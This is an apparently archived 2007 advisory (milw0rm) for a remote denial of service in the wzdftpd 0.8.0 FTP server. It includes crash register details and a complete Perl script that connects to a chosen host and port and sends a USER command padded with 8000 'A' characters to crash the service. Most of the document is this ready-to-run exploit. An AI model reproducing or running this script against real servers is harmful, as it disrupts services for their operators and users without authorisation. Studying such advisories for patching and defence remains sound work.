# Indonesian Newhack Security Advisory
# ------------------------------------
# wzdftpd <= 0.8.0 (USER) Remote Danial of Service
# Waktu            :  Oct 07 2007 05:00AM
# Software        :  wzdftpd 0.8.0
# Version        :  0.8.0 Linux and Windows
# Vendor        :  http://www.wzdftpd.net/
# Ditemukan oleh    :  k1tk4t  |  http://newhack.org
# Lokasi        :  Indonesia
#
# Tested on Windows XP SP2 and Linux CentOS
#
# C0000005 (ACCESS VIOLATION)
#
# EAX 00000001
# ECX 00A2F410
# EDX 003E0608
# EBX 00000000
# ESP 00FDEB58
# EBP 00FDFFEC
# ESI 00A25118
# EDI 00000094
#
#
#
#  Terima Kasih untuk;
#  str0ke, DNX, xoron
#  -[opt1lc, fl3xu5, ghoz]-
#  nyubi,iFX,kin9k0ng,bius,selikoer,aldy_BT,NoGe
#  Komunitas Security dan Hacker Indonesia
#
#!/usr/bin/perl
use IO::Socket;

print "\n  |-------------------------------------------------|";
print "\n  |         Indonesian Newhack Technology           |";
print "\n  |-------------------------------------------------|";
print "\n  |  wzdftpd 0.8.0 (USER) Remote Danial of Service  |";
print "\n  |     Found by k1tk4t [k1tk4t(at)newhack.org]     |";
print "\n  |-------------------------------------------------|";
print "\n  |";

if (@ARGV < 2)
{
 print "\n[!] Penggunaan: perl wzdftpd0.8.0.pl [Host] [Port] ";
print "\n[!] Contoh: perl wzdftpd0.8.0.pl 127.0.0.1 21";
 exit;
}


$ip = $ARGV[0];
$port = $ARGV[1];

$exploit = "A" x 8000;

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "\n[-] Koneksi: Gagal!\n";
print "\n[+] Koneksi: Ok!\n";
print "[+] Menggirim Packet DoS...\n";

print $socket "USER $exploit\n";
sleep(5);
close($socket);

print "[?] Mati Sudah!\n";

# milw0rm.com [2007-10-07]
